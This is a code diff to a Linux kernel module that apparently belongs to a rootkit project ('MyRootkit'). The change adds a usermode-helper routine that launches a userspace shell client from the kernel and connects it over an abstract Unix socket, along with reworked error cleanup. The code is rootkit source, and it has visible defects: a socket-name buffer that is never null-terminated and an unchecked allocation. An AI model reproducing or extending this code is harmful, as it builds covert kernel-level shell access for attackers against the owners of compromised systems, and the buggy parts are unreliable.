@@ -3,6 +3,9 @@
 #include <linux/init.h>
 #include <linux/socket.h>
 #include <linux/net.h>
+#include <linux/umh.h>
+#include <linux/pipe_fs_i.h>
+#include <linux/file.h>
 #include <linux/un.h>
 #include <net/net_namespace.h>
 #include <net/sock.h>
@@ -11,6 +14,7 @@
 #include "headers/shell.h"
 
 #define SOCK_PATH ("\0test-file2")
+#define USERMODE_HELPER_PATH ("/home/yanayg/MyRootkit/usermode/client")
 #define SOCK_PATH_LEN (sizeof(SOCK_PATH))
 #define SOCK_DEV_MTU (2048)
 #define DELAY_JIFFIES (2)
@@ -29,6 +33,51 @@ struct stream_data {
     struct delayed_work work;
     struct open_stream *st;
 };
+
+static int job_t_to_str(char *buffer, int len, job_id_t job_id) {
+    int i;
+    for (i = 0; i < len; i++) {
+        buffer[len - i - 1] = '0' + job_id % 10;
+        job_id /= 10;
+    }
+    return job_id;
+}
+
+static int start_usermode_shell(job_id_t job_id) {
+    int err;
+    struct subprocess_info *info;
+    char sock_path[6];
+    char *argv[] = { USERMODE_HELPER_PATH, sock_path, NULL };
+    static char *envp[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+		NULL
+	};
+
+    // strcpy(sock_path, SOCK_PATH);
+    job_t_to_str(sock_path, 6, job_id);
+    // printk("%s\n" KERN_INFO, sock_path);
+
+    info = call_usermodehelper_setup(
+        USERMODE_HELPER_PATH, 
+        argv, 
+        envp,
+        GFP_KERNEL,
+        NULL, 
+        NULL, 
+        NULL
+    );
+
+    // This value can be overriden in `call_usermodehelper_setup` by setting CONFIG_STATIC_USERMODEHELPER_PATH,
+    // this means the helpers can be tracked or disabled.
+    info->path = USERMODE_HELPER_PATH;
+
+    if ((err =  call_usermodehelper_exec(info, UMH_KILLABLE))) {
+        return err;
+    }
+    return 0;
+}
 
 static void poll_shell_work(struct work_struct *work) {
     struct stream_data *data = container_of(to_delayed_work(work), struct stream_data, work);
@@ -72,8 +121,10 @@ int open_shell(struct open_stream *st) {
     struct stream_data *data;
     int res;
 
+    data = kmalloc(sizeof(struct stream_data), GFP_KERNEL);
+
     if ((res = sock_create_kern(&init_net, AF_UNIX, SOCK_SEQPACKET, 0, &srvsock))) {
-        return 1;
+        goto data;
     }
 
     memset(&saddr, 0, sizeof(saddr));
@@ -82,15 +133,17 @@ int open_shell(struct open_stream *st) {
     
     if ((res = kernel_bind(srvsock, (struct sockaddr *)&saddr.addr, sizeof(saddr.addr)))) {
         printk(KERN_INFO "Couldn't bind to addr\n");
-        goto done;
+        goto sock;
     }
     printk(KERN_INFO "Bound to addr\n");
 
     if ((res = kernel_listen(srvsock, 1))) {
-        goto done;
+        goto sock;
     }
 
-    data = kmalloc(sizeof(struct stream_data), GFP_KERNEL);
+    if ((res = start_usermode_shell(st->origin.job_id))) {
+        goto sock;
+    }
 
     res = kernel_accept(srvsock, &data->sock, 0);
 
@@ -100,8 +153,14 @@ int open_shell(struct open_stream *st) {
 
     schedule_delayed_work(&data->work, DELAY_JIFFIES);
 
-done:
+    return 0;
+
+sock:
     sock_release(srvsock);
+
+data: 
+    kfree(data);
+
     return res;
 }
 
